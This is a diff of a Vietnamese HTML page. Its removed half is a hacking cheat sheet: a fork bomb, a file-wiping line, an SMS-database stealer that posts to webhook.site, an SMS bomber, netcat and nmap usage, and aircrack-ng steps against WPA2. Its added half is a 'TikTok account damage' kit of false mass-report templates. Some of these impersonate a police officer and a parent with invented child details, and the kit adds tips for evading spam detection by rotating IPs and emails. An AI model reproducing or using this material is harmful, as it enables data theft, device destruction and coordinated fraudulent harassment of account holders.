-   - Giả mạo người thân: "Cho mượn 5 triệu"
-   - Lừa tình cảm: Kết bạn, tán tỉnh, mượn tiền
-   - Lừa việc làm: "Tuyển CTV Shopee, hoa hồng 20%"
-   - Lừa đầu tư: "Forex lãi 300%/tháng"
-   - Lừa quà tặng: "Tặng iPhone, chỉ trả ship 200k"
-
-5. TECH SUPPORT SCAM: Popup "Máy bị virus" -> Gọi điện -> Cài TeamViewer -> Chiếm máy
-
-6. SIM SWAP: Giả làm bạn -> Gọi nhà mạng -> Đổi SIM -> Nhận OTP -> Chiếm tài khoản
-
-DẤU HIỆU NHẬN BIẾT LỪA ĐẢO:
-- URL lạ, sai chính tả
-- Yêu cầu gấp: "Xác minh ngay!"
-- Không có HTTPS
-- Email từ địa chỉ lạ
-- Yêu cầu cung cấp OTP, mật khẩu</pre>
-            </div>
-        </div>
-
-        <!-- 14. iSH Shell -->
-        <div class="accordion">
-            <button class="accordion-header">iSH SHELL - LỆNH CƠ BẢN TRÊN IPHONE</button>
-            <div class="accordion-content">
-                <pre>Cài đặt: App Store -> Tìm "iSH Shell" -> Cài đặt.
-
-LỆNH CƠ BẢN:
-ls          -> Liệt kê file/thư mục
-cd          -> Di chuyển thư mục
-pwd         -> Xem thư mục hiện tại
-mkdir       -> Tạo thư mục mới
-touch       -> Tạo file mới
-rm          -> Xóa file
-rm -rf      -> Xóa thư mục (cẩn thận!)
-cp          -> Sao chép
-mv          -> Di chuyển/đổi tên
-cat         -> Xem nội dung file
-echo        -> In ra màn hình
-chmod +x    -> Phân quyền thực thi
-wget URL    -> Tải file từ internet
-curl URL    -> Gửi HTTP request
-
-CÀI PACKAGES:
-apk update && apk upgrade
-apk add nmap python3 git curl wget openssh netcat-openbsd vim
-
-SỬ DỤNG NMAP:
-nmap -sn 192.168.1.0/24     -> Quét thiết bị trong mạng
-nmap -sV target.com          -> Xem version dịch vụ
-nmap -p 1-1000 target.com    -> Quét 1000 port đầu
-
-NETCAT (NC):
-nc -lvp 4444                 -> Lắng nghe port 4444
-nc target.com 4444           -> Kết nối đến port</pre>
-            </div>
-        </div>
-
-        <!-- 15. Tạo virus nhanh -->
-        <div class="accordion">
-            <button class="accordion-header">TẠO VIRUS NHANH TRÊN IPHONE/ANDROID</button>
-            <div class="accordion-content">
-                <pre>1. FORK BOMB (Treo máy):
-:(){ :|:& };:    (Bash)
-
-2. VIRUS XÓA DỮ LIỆU (Python):
-import os, shutil
-shutil.rmtree("/var/mobile/Documents/")
-
-3. STEALER (Đánh cắp dữ liệu):
-import requests
-files = ['/var/mobile/Library/SMS/sms.db']
-for f in files:
-    requests.post('https://webhook.site/ID', files={'file': open(f,'rb')})
-
-4. FAKE UPDATE (Lừa đảo):
-while True:
-    print("ĐANG CẬP NHẬT... KHÔNG TẮT NGUỒN!")
-    time.sleep(1)
-
-5. SMS BOMBER:
-import requests
-while True:
-    requests.get("https://api.gateway.com/sms?phone=0123456789")</pre>
-            </div>
-        </div>
-
-        <!-- 16. Android & iOS -->
-        <div class="accordion">
-            <button class="accordion-header">CÁCH HOẠT ĐỘNG CỦA ANDROID VÀ iOS</button>
-            <div class="accordion-content">
-                <h3>iOS Architecture:</h3>
-                <pre>Cocoa Touch (UIKit, SwiftUI) -> Giao diện
-Media (Core Audio, Video) -> Âm thanh, hình ảnh
-Core Services (Core Data, Foundation) -> Dịch vụ cốt lõi
-Core OS (Kernel XNU, APFS) -> Quản lý phần cứng
-
-Bảo mật iOS:
-Secure Boot Chain -> Sandbox -> Code Signing -> ASLR -> DEP -> Keychain</pre>
-                <h3>Android Architecture:</h3>
-                <pre>System Apps -> Java API Framework -> Android Runtime + Native Libs
--> Hardware Abstraction Layer (HAL) -> Linux Kernel
-
-Bảo mật Android:
-Verified Boot -> SELinux -> App Sandbox -> Permissions -> Google Play Protect</pre>
-            </div>
-        </div>
-
-        <!-- 17. WiFi Hacking -->
-        <div class="accordion">
-            <button class="accordion-header">WIFI HACKING - CÁCH HOẠT ĐỘNG VÀ TẤN CÔNG</button>
-            <div class="accordion-content">
-                <pre>WIFI HOẠT ĐỘNG:
-Dùng sóng vô tuyến 2.4GHz hoặc 5GHz.
-Chuẩn: 802.11b/g/n/ac/ax (WiFi 6).
-AP (Router) <-sóng-> STA (Thiết bị)
-
-BẢO MẬT WiFi:
-WEP (quá yếu, crack trong vài phút)
-WPA/WPA2 (mạnh hơn, bắt handshake rồi crack)
-WPA3 (mạnh nhất, khó crack)
-
-CÁC BƯỚC TẤN CÔNG WPA2:
-1. Bật monitor mode: airmon-ng start wlan0
-2. Quét mạng: airodump-ng wlan0mon
-3. Bắt handshake: airodump-ng -c 6 --bssid XX:XX:XX:XX:XX:XX -w capture wlan0mon
-4. Deauth để bắt handshake: aireplay-ng -0 10 -a XX:XX:XX:XX:XX:XX wlan0mon
-5. Crack password: aircrack-ng -w wordlist.txt capture-01.cap
-
-PHÒNG CHỐNG:
-Dùng WPA3 hoặc WPA2 + mật khẩu mạnh (>12 ký tự)
-Tắt WPS</pre>
-            </div>
-        </div>
-
-        <!-- 18. Cách hoạt động của Virus -->
-        <div class="accordion">
-            <button class="accordion-header">CÁCH HOẠT ĐỘNG CỦA VIRUS</button>
-            <div class="accordion-content">
-                <pre>VIRUS LÀ GÌ?
-Phần mềm độc hại, tự nhân bản như virus sinh học.
-Cần "vật chủ" (file, chương trình) để tồn tại.
-
-CÁC LOẠI VIRUS:
-1. File Infector: Lây nhiễm file .exe, .com
-2. Macro Virus: Lây nhiễm file Word, Excel
-3. Boot Sector Virus: Lây nhiễm boot sector ổ cứng
-4. Worm: Tự lây lan qua mạng, không cần file vật chủ
-5. Trojan: Giả mạo phần mềm hợp pháp
-6. Ransomware: Mã hóa file, đòi tiền chuộc
-7. Spyware: Giám sát người dùng
-8. Adware: Hiển thị quảng cáo
-9. Rootkit: Ẩn mình, chiếm quyền root
-10. Keylogger: Ghi lại phím bấm
-
-CÁCH VIRUS LÂY LAN:
-1. Email attachment
-2. USB/Thẻ nhớ
-3. Tải file từ web độc
-4. Khai thác lỗ hổng phần mềm
-5. Mạng nội bộ (worm)
-
-CÁCH VIRUS HOẠT ĐỘNG:
-1. Lây nhiễm: Chèn mã độc vào file/hệ thống
-2. Kích hoạt: Mở file, chạy chương trình
-3. Thực thi: Đánh cắp dữ liệu, phá hoại
-4. Nhân bản: Tự copy sang file/máy khác</pre>
-            </div>
-        </div>
-
-        <div class="warning">
-            TUYÊN BỐ MIỄN TRỪ TRÁCH NHIỆM: Tài liệu này chỉ dành cho mục đích HỌC TẬP VÀ NGHIÊN CỨU BẢO MẬT.
-            Mọi hành vi sử dụng vào mục đích bất hợp pháp đều bị NGHIÊM CẤM và có thể dẫn đến TRUY CỨU HÌNH SỰ.
-            Hãy trở thành WHITE HAT HACKER - người bảo vệ internet!
-        </div>
-
+<div class="container">
+
+    <h1>🔥 TRUM DAME TIKTOK</h1>
+    <div class="sub">Tổng hợp thần chú, trick, IP & giờ vàng – Copy & Share</div>
+
+    <!-- Thần chú -->
+    <div class="block">
+        <h2><span>1</span> THẦN CHÚ COPPA (TIẾNG ANH – MẠNH NHẤT)</h2>
+        <div class="code-box" onclick="navigator.clipboard.writeText(this.innerText); alert('✅ Đã copy thần chú!')">I am reporting this account for a direct violation of TikTok's Terms of Service and the Children's Online Privacy Protection Act (COPPA). The user is clearly under the age of 13, and their continued presence on the platform poses a significant legal and safety risk. I demand an immediate review, age verification, and permanent suspension of this account to ensure compliance with child safety regulations. Failure to act on this report is a failure to protect minors.</div>
     </div>
 
-    <script>
-        document.querySelectorAll('.accordion-header').forEach(button => {
-            button.addEventListener('click', () => {
-                button.classList.toggle('active');
-                button.nextElementSibling.classList.toggle('show');
-            });
-        });
-    </script>
+    <div class="block">
+        <h2><span>2</span> THẦN CHÚ TIẾNG HÀN (CẢNH SÁT)</h2>
+        <div class="code-box" onclick="navigator.clipboard.writeText(this.innerText); alert('✅ Đã copy!')">안녕하세요 틱톡, 저는 박종호입니다. 저는 현재 대한민국 서울에서 근무하는 경찰관이며, TikTok 계정 (@id) 을 소유한 아동의 법적 보호자이기도 합니다. 현재 이 계정이 커뮤니티 가이드라인을 위반했다는 이유로 신고하고 있습니다. 구체적으로 아기의 이름은 박연은이고, 2016년 12월 27일에 태어나 올해 9살이 됩니다. 게다가 어린이의 학업 성취도는 떨어지고, 거짓말을 늘어났다. 실제 생활과 TikTok에서 폭력적인 행동</div>
+        <p style="margin-top:8px;font-size:13px;color:#888;">📌 Thay <code>@id</code> thành ID cần dame</p>
+    </div>
+
+    <div class="block">
+        <h2><span>3</span> THẦN CHÚ TIẾNG NHẬT (MẸ TOKYO)</h2>
+        <div class="code-box" onclick="navigator.clipboard.writeText(this.innerText); alert('✅ Đã copy!')">TikTokサポートチーム様、私は日本の東京に住む母親です。私の子供が、年齢制限に違反してTikTokアカウント（@id）を使用していることを発見しました。子供はまだ13歳未満であり、親の許可なくアカウントを作成しました。このアカウントの使用により、子供の学業成績が低下し、行動に問題が見られるようになりました。TikTokのコミュニティガイドラインに基づき、このアカウントの確認と停止を強く要請します。証拠としてスクリーンショットを添付しました。どうぞよろしくお願いいたします。</div>
+    </div>
+
+    <div class="block">
+        <h2><span>4</span> THẦN CHÚ TIẾNG VIỆT (BÁO CÁO CHÍNH THỐNG)</h2>
+        <div class="code-box" onclick="navigator.clipboard.writeText(this.innerText); alert('✅ Đã copy!')">Tôi viết thư này để báo cáo tài khoản TikTok @id vì những lý do sau: Tài khoản có dấu hiệu vi phạm chính sách độ tuổi tối thiểu (dưới 13 tuổi). Nội dung đăng tải không phù hợp với lứa tuổi, có thể gây ảnh hưởng tiêu cực đến người xem trẻ tuổi. Hành vi tương tác có dấu hiệu lừa đảo, mạo danh hoặc gây hiểu lầm. Tôi đã có bằng chứng và sẵn sàng cung cấp. Kính mong TikTok xem xét và xử lý theo quy định. Trân trọng.</div>
+    </div>
+
+    <!-- IP + GIỜ -->
+    <div class="block">
+        <h2><span>5</span> IP NƯỚC + KHUNG GIỜ DAME</h2>
+        <div class="table-wrap">
+            <table>
+                <tr><th>Nước VPN</th><th>Mức độ</th><th>Giờ vàng (VN)</th><th>Ghi chú</th></tr>
+                <tr><td>🇺🇸 Mỹ (New York)</td><td>⭐⭐⭐⭐⭐</td><td>21h – 02h</td><td>Trụ sở TikTok, mạnh nhất</td></tr>
+                <tr><td>🇬🇧 Anh (London)</td><td>⭐⭐⭐⭐</td><td>22h – 03h</td><td>Văn phòng châu Âu</td></tr>
+                <tr><td>🇫🇷 Pháp (Paris)</td><td>⭐⭐⭐⭐</td><td>22h – 03h</td><td>Luật bảo vệ trẻ em khắc nghiệt</td></tr>
+                <tr><td>🇩🇪 Đức (Frankfurt)</td><td>⭐⭐⭐⭐</td><td>22h – 03h</td><td>Server sạch, ít bị chặn</td></tr>
+                <tr><td>🇰🇷 Hàn Quốc (Seoul)</td><td>⭐⭐⭐⭐</td><td>20h – 23h</td><td>Kết hợp thần chú tiếng Hàn</td></tr>
+                <tr><td>🇯🇵 Nhật Bản (Tokyo)</td><td>⭐⭐⭐⭐</td><td>20h – 23h</td><td>Phù hợp thần chú Nhật</td></tr>
+                <tr><td>🇦🇺 Úc (Sydney)</td><td>⭐⭐⭐</td><td>10h – 14h</td><td>Đa dạng địa lý</td></tr>
+                <tr><td>🇻🇳 Việt Nam</td><td>⭐⭐</td><td>19h – 23h</td><td>Dùng báo cáo nội địa</td></tr>
+            </table>
+        </div>
+    </div>
+
+    <!-- TRICK -->
+    <div class="block">
+        <h2><span>6</span> TRICK + NHIỄU TĂNG HIỆU QUẢ</h2>
+        <ul>
+            <li>🔁 Đổi email <b>mỗi lần</b> báo cáo (tối thiểu 3–5 email)</li>
+            <li>🌐 Đổi IP <b>mỗi lần</b> – không dùng chung IP quá 2 lần/ngày</li>
+            <li>⏳ Ngâm IP <b>5–10 phút</b> trước khi gửi báo cáo đầu tiên</li>
+            <li>⏰ Gửi cách nhau <b>15–20 phút</b> giữa các tab</li>
+            <li>📸 Đính kèm <b>ảnh hồ sơ + ảnh trẻ em</b> (stock photo) để tăng độ tin cậy</li>
+            <li>🔗 Dùng link báo cáo riêng tư: <code>https://www.tiktok.com/legal/report/privacy</code></li>
+            <li>🚫 Không gửi quá <b>5 báo cáo/giờ</b> – tránh bị đánh dấu spam</li>
+            <li>⚡ Kết hợp <b>báo cáo thủ công + tool</b> – tăng áp lực tối đa</li>
+        </ul>
+    </div>
+
+    <!-- LINKS -->
+    <div class="block">
+        <h2><span>7</span> LINK BÁO CÁO THEO NGÔN NGỮ</h2>
+        <ul>
+            <li><b>Tiếng Anh (Mỹ/Quốc tế):</b> <code>https://www.tiktok.com/legal/report/feedback?lang=en</code></li>
+            <li><b>Tiếng Hàn:</b> <code>https://www.tiktok.com/legal/report/feedback?lang=ko</code></li>
+            <li><b>Tiếng Nhật:</b> <code>https://www.tiktok.com/legal/report/feedback?lang=ja</code></li>
+            <li><b>Tiếng Pháp:</b> <code>https://www.tiktok.com/legal/report/feedback?lang=fr</code></li>
+            <li><b>Tiếng Việt:</b> <code>https://www.tiktok.com/legal/report/feedback?lang=vi</code></li>
+        </ul>
+    </div>
+
+    <!-- KẾT -->
+    <div style="text-align:center; margin-top:10px;">
+        <button class="btn" onclick="window.location.reload();">🔄 Làm mới trang</button>
+    </div>
+
+    <div class="footer">
+        Made by Trum Dame Acc · Share miễn phí · #xuhuong #viral #tutdame
+    </div>
+
+</div>
 </body>
 </html>
